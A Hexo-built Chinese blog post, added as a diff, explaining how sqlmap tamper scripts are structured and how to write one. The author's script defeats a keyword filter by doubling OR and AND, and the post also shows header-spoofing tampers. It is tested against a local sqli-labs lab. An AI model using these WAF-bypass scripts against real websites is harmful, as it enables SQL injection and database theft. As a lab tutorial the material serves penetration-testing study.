@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/rabbit.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/rabbit_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="Sqlmap-tamper简介sqlmap的--tamper参数可以用给定脚本修改注入数据，主要功能是用来绕过各种waf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqlmap-tamper">
+<meta property="og:url" content="http://example.com/2022/02/23/Sqlmap-tamper/index.html">
+<meta property="og:site_name" content="Jasontt&#39;s Blog">
+<meta property="og:description" content="Sqlmap-tamper简介sqlmap的--tamper参数可以用给定脚本修改注入数据，主要功能是用来绕过各种waf">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223191305566.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223191416824.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195544409.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195602740.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195732933.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195826674.png">
+<meta property="article:published_time" content="2022-02-23T12:03:30.000Z">
+<meta property="article:modified_time" content="2022-02-23T12:06:57.274Z">
+<meta property="article:author" content="Jason Tu">
+<meta property="article:tag" content="sqlmap">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223191305566.png">
+
+
+<link rel="canonical" href="http://example.com/2022/02/23/Sqlmap-tamper/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/02/23/Sqlmap-tamper/","path":"2022/02/23/Sqlmap-tamper/","title":"Sqlmap-tamper"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Sqlmap-tamper | Jasontt's Blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Jasontt's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+        <li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Sqlmap-tamper"><span class="nav-number">1.</span> <span class="nav-text">Sqlmap-tamper</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tamper%E7%BB%93%E6%9E%84"><span class="nav-number">1.2.</span> <span class="nav-text">Tamper结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E5%85%A5%E5%BA%93"><span class="nav-number">1.2.1.</span> <span class="nav-text">引入库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PRIORITY"><span class="nav-number">1.2.2.</span> <span class="nav-text">PRIORITY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dependencies"><span class="nav-number">1.2.3.</span> <span class="nav-text">dependencies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tamper"><span class="nav-number">1.2.4.</span> <span class="nav-text">tamper</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tamper%E7%BC%96%E5%86%99"><span class="nav-number">1.3.</span> <span class="nav-text">Tamper编写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.3.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">1.3.2.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">1.3.3.</span> <span class="nav-text">运行结果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Jason Tu"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">Jason Tu</p>
+  <div class="site-description" itemprop="description">一只谦虚的兔子</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4xwi11</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://scr1pt-kid.github.io/" title="https:&#x2F;&#x2F;scr1pt-kid.github.io&#x2F;" rel="noopener" target="_blank">Scr1pt</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.yuque.com/jinjinshigekeaigui" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;jinjinshigekeaigui" rel="noopener" target="_blank">Jiang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/yunqian2017" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017" rel="noopener" target="_blank">Openg</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/Sqlmap-tamper/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="Jason Tu">
+      <meta itemprop="description" content="一只谦虚的兔子">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jasontt's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Sqlmap-tamper
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-02-23 20:03:30 / Modified: 20:06:57" itemprop="dateCreated datePublished" datetime="2022-02-23T20:03:30+08:00">2022-02-23</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Sqlmap-tamper"><a href="#Sqlmap-tamper" class="headerlink" title="Sqlmap-tamper"></a>Sqlmap-tamper</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sqlmap的<code>--tamper</code>参数可以用给定脚本修改注入数据，主要功能是用来绕过各种waf</p>
+<span id="more"></span>
+
+<h2 id="Tamper结构"><a href="#Tamper结构" class="headerlink" title="Tamper结构"></a>Tamper结构</h2><p>从sqlmap自带的tamper中随便找了一个</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces each keyword character with lower case value (e.g. SELECT -&gt; select)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass very weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string">          that has poorly written permissive regular expressions</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;insert&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="keyword">for</span> match <span class="keyword">in</span> re.finditer(<span class="string">r&quot;\b[A-Za-z_]+\b&quot;</span>, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> word.upper() <span class="keyword">in</span> kb.keywords:</span><br><span class="line">                retVal = retVal.replace(word, word.lower())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="引入库"><a href="#引入库" class="headerlink" title="引入库"></a>引入库</h3><p>最开始导入必须的库</p>
+<h3 id="PRIORITY"><a href="#PRIORITY" class="headerlink" title="PRIORITY"></a>PRIORITY</h3><p>用来定义脚本的优先级，参数如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOWEST = -<span class="number">100</span></span><br><span class="line">LOWER = -<span class="number">50</span></span><br><span class="line">LOW = -<span class="number">10</span></span><br><span class="line">NORMAL = <span class="number">0</span></span><br><span class="line">HIGH = <span class="number">10</span></span><br><span class="line">HIGHER = <span class="number">50</span></span><br><span class="line">HIGHEST = <span class="number">100</span></span><br></pre></td></tr></table></figure>
+
+<p>当同时使用多个tamper时，按优先级从高到低使用，编写的时候还得看运用场景，就跑一个tamper感觉这个参数也没啥必要</p>
+<h3 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h3><p>一般用来输出提示信息，比如tamper支持的使用环境或场景，也可以不写东西直接pass</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">singleTimeWarnMessage() #在控制台中输出警告信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><p>tamper脚本主要函数，用于实现tamper的功能</p>
+<p><code>payload</code>参数为sqlmap生成的原始payload</p>
+<p><code>**kwargs</code>参数用的比较少，下面两个tamper中<code>kwargs</code>参数都通过更改请求头来绕waf</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#varnish.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-originating-IP&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#xforwardedfor.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27; (and alike)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;CF-Connecting-IP&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;True-Client-IP&quot;</span>] = randomIP()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reference: https://developer.chrome.com/multidevice/data-compression-for-isps#proxy-connection</span></span><br><span class="line">    headers[<span class="string">&quot;Via&quot;</span>] = <span class="string">&quot;1.1 Chrome-Compression-Proxy&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reference: https://wordpress.org/support/topic/blocked-country-gaining-access-via-cloudflare/#post-9812007</span></span><br><span class="line">    headers[<span class="string">&quot;CF-IPCountry&quot;</span>] = random.sample((<span class="string">&#x27;GB&#x27;</span>, <span class="string">&#x27;US&#x27;</span>, <span class="string">&#x27;FR&#x27;</span>, <span class="string">&#x27;AU&#x27;</span>, <span class="string">&#x27;CA&#x27;</span>, <span class="string">&#x27;NZ&#x27;</span>, <span class="string">&#x27;BE&#x27;</span>, <span class="string">&#x27;DK&#x27;</span>, <span class="string">&#x27;FI&#x27;</span>, <span class="string">&#x27;IE&#x27;</span>, <span class="string">&#x27;AT&#x27;</span>, <span class="string">&#x27;IT&#x27;</span>, <span class="string">&#x27;LU&#x27;</span>, <span class="string">&#x27;NL&#x27;</span>, <span class="string">&#x27;NO&#x27;</span>, <span class="string">&#x27;PT&#x27;</span>, <span class="string">&#x27;SE&#x27;</span>, <span class="string">&#x27;ES&#x27;</span>, <span class="string">&#x27;CH&#x27;</span>), <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<h2 id="Tamper编写"><a href="#Tamper编写" class="headerlink" title="Tamper编写"></a>Tamper编写</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h3><p>phpstudy + sqli-labs</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223191305566.png" alt="image-20220223191305566"></p>
+<p>过滤了<code>or</code>和<code>and</code></p>
+<p>查看源文件，这两个关键词被替换为空了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223191416824.png" alt="image-20220223191416824"></p>
+<p>并且在执行sql查询之前，用户输入的内容只用<code>blacklist</code>函数过滤了一遍，那么这里就可以直接用双写来绕过</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;bypass:or,and&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    双写绕过关键词on和and过滤</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = re.sub(<span class="string">r&quot;(OR)&quot;</span>,<span class="string">&quot;OORR&quot;</span>,retVal)</span><br><span class="line">    retVal = re.sub(<span class="string">r&quot;(AND)&quot;</span>, <span class="string">&quot;AANDND&quot;</span>, retVal)</span><br><span class="line">    <span class="comment"># retVal = re.sub(r&quot;(AND)&quot;, &quot;%26%26&quot;, retVal) AND可用&amp;&amp;替换</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p>执行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-25/?id=1 --tamper=test --proxy=http://127.0.0.1:80 -v 3 --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195544409.png" alt="image-20220223195544409"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195602740.png" alt="image-20220223195602740"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195732933.png" alt="image-20220223195732933"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195826674.png" alt="image-20220223195826674"></p>
+<p>可以看到原始payload中的关键词被替换掉了，最终也成功获取了数据库</p>
+<p>END</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>sqlmap作为一款强大的sql注入工具效率远远高于纯手工注入，再根据实际渗透的场景来编写tamper，两者结合使用可以节约很多时间</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sqlmap/" rel="tag"># sqlmap</a>
+              <a href="/tags/python/" rel="tag"># python</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/23/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E7%AF%87/" rel="prev" title="远控免杀——白名单篇">
+                  <i class="fa fa-chevron-left"></i> 远控免杀——白名单篇
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jason Tu</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
